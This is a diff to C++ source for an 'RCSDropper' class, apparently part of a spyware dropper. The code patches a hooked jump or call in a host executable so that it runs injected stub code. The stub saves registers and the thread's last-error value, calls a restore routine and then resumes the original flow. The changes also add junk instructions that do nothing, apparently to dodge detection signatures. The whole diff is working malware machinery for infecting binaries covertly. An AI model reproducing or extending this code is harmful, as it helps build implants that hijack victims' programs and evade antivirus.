@@ -44,17 +44,36 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
     switch (hookedInstruction_.d.Instruction.BranchType) {
         case JmpType:
         {
-            // account for initial 4 bytes containing address of next byte
-            DWORD codeVA = stubVA + sizeof(DWORD);
-            DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
-            std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
-            stub.call( (void*) (addr + 0x1000));
+	    if (hookedInstruction_.len == 5)
+	    {
+		DWORD codeVA = stubVA + sizeof(DWORD);
+		DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
+	        std::cout << "Stage1 stub: jmp 0x" << hex << codeVA << dec << std::endl;
+		stub.call( (void*) (addr + 0x1000));
+	    }
+	    else if (hookedInstruction_.len == 6)
+            {
+                cout << "Stage1 stub: jmp dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
+		stub.call(AsmJit::dword_ptr_abs((void*)stubVA));
+            }
         }
         break;
         case CallType:
         {
-            cout << "Stage1 stub: call dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
-            stub.call(AsmJit::dword_ptr_abs( (void*)stubVA ));
+	    printf("LEN => %08x\n", hookedInstruction_.len);
+            if (hookedInstruction_.len == 5)
+	    {
+	            // account for initial 4 bytes containing address of next byte
+        	    DWORD codeVA = stubVA + sizeof(DWORD);
+	            DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
+	            std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
+	            stub.call( (void*) (addr + 0x1000));
+	    }
+	    else if (hookedInstruction_.len == 6)
+	    {
+ 	           cout << "Stage1 stub: call dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
+        	   stub.call(AsmJit::dword_ptr_abs( (void*)stubVA ));
+	    }
         }
         break;
     }
@@ -104,22 +123,22 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     stub.data(&restoreVA, sizeof(DWORD));
     for (unsigned int i=0; i<0x1000; i++)
     	    stub.nop();
+/*
     stub.pushfd();
     stub.nop();
     stub.pushad();
     stub.nop();
-/*
-    stub.push(headerVA);
 
-    stub.pop(AsmJit::eax);
-stub.bind(start_loop);
-    stub.inc(AsmJit::eax);
-    stub.mov(AsmJit::ebx, AsmJit::dword_ptr(AsmJit::eax));
-    stub.inc(AsmJit::ebx);
-    stub.cmp(AsmJit::ebx, 0x2e312e32);
-    stub.jne(start_loop);
-    stub.push(AsmJit::eax);
-*/
+//    stub.push(headerVA);
+//    stub.pop(AsmJit::eax);
+//stub.bind(start_loop);
+//    stub.inc(AsmJit::eax);
+//    stub.mov(AsmJit::ebx, AsmJit::dword_ptr(AsmJit::eax));
+//    stub.inc(AsmJit::ebx);
+//    stub.cmp(AsmJit::ebx, 0x2e312e32);
+//    stub.jne(start_loop);
+//    stub.push(AsmJit::eax);
+
 
     stub.nop();
     stub.call(((DWORD) restore) + (dropperVA - currentVA));
@@ -129,6 +148,46 @@ stub.bind(start_loop);
     stub.nop();
     stub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
     stub.nop();
+    stub.popfd();
+    stub.nop();
+    stub.ret();
+*/
+    stub.push(AsmJit::eax);					// nop
+    stub.pop(AsmJit::eax);					// nop
+    stub.pushfd(); // restoreVA starts here
+    stub.mov(AsmJit::eax, AsmJit::eax);		// nop
+    stub.pushad();
+    stub.push(1);							// nop
+    stub.add(AsmJit::esp, 4);				// nop
+
+    // save last_error
+    stub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
+    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
+    stub.mov(AsmJit::eax, dword_ptr(AsmJit::eax, 0x34));
+    stub.push(AsmJit::eax);
+
+    //stub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );
+    stub.call( ((DWORD) restore) + (dropperVA - currentVA) );
+
+    // restore last_error
+    stub.push(AsmJit::eax);					// nop
+    stub.pop(AsmJit::eax);					// nop
+    stub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+    stub.mov(AsmJit::eax, AsmJit::eax);		// nop
+    stub.pop(AsmJit::ebx);
+    stub.push(1);							// nop
+    stub.add(AsmJit::esp, 4);				// nop
+    stub.mov(dword_ptr(AsmJit::eax, 0x34), AsmJit::ebx);
+    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
+    stub.xchg(AsmJit::ebx, AsmJit::eax);		// nop
+    stub.popad();
+    stub.push(AsmJit::eax);					// nop
+    stub.pop(AsmJit::eax);					// nop
+
+    // substract from retaddr before restoring flags
+    stub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
+    stub.add(AsmJit::eax, 0);
     stub.popfd();
     stub.nop();
     stub.ret();
